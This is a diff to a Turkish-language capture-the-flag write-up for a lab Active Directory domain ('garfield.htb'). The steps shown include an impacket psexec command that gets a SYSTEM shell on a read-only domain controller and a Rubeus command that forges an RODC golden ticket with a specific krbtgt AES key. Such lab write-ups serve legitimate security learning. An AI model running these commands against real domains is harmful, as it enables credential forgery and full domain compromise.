@@ -218,6 +218,9 @@ SMB ve NetInfo bilgileriyle doğrulandı.
 
 
 
+17- İç ağ /etc/hosts kaydı + Host Ayakta mı ?
+
+echo "192.168.100.2 RODC.garfield.htb" | sudo tee -a /etc/hosts
 
 
 
@@ -295,7 +298,6 @@ RODC01$'in msDS-AllowedToActOnBehalfOfOtherIdentity özelliğine DC02$'i yazıyo
 21- Zaman Senkronizasyonu
 
 sudo ntpdate -u DC01.garfield.htb
-
 Kerberos, saat farkına karşı hassas olduğu için saldırgan makinenin saatini DC ile senkronize ediyoruz.
 
 
@@ -340,7 +342,6 @@ RODC01'de Administrator context'inde dosya yazabildiğimizi doğruluyoruz. RODC 
 25- psexec ile RODC01'de SYSTEM Shell Alma
 
 python3 /usr/share/doc/python3-impacket/examples/psexec.py -k -no-pass GARFIELD.HTB/Administrator@RODC01.garfield.htb
-
 smbclient.py dosya transferi sağladığı için, mimikatz'ı çalıştırabilmek üzere psexec.py ile aynı kerberos bileti kullanılarak RODC01 üzerinde tam interaktif bir SYSTEM shell elde ediyoruz.
 
 
@@ -383,7 +384,7 @@ DC'den key list talep edemez.
 
 28- RODC Golden Ticket Oluşturma (Rubeus)
 
-Rubeus.exe golden /rodcNumber:8245 /flags:forwardable,renewable,enc_pa_rep /nowrap /outfile:administrator.kirbi /aes256:d6c93cbe006372adb8403630f9e86594f52c8105a52f9b21fef62e9c7a75e240 /user:Administrator /id:500 /domain:garfield.htb /sid:S-1-5-21-2502726253-3859040611-225969357 /sdelay:7200
+Rubeus.exe golden /rodcNumber:8245 /flags:forwardable,renewable,enc_pa_rep /nowrap /outfile:administrator.kirbi /aes256:d6c93cbe006372adb8403630f9e86594f52c8105a52f9b21fef62e9c7a75e240 /user:Administrator /id:500 /domain:garfield.htb /sid:S-1-5-21-2502726253-3859040611-225969357 /sdelay:3600
 
 krbtgt_8245'in AES256 anahtarıyla, Administrator (RID: 500) için sahte bir TGT (Golden Ticket) forge ediyoruz. /rodcNumber:8245 parametresi, biletin bu RODC'ye özel krbtgt tarafından imzalandığını belirtiyor.
 
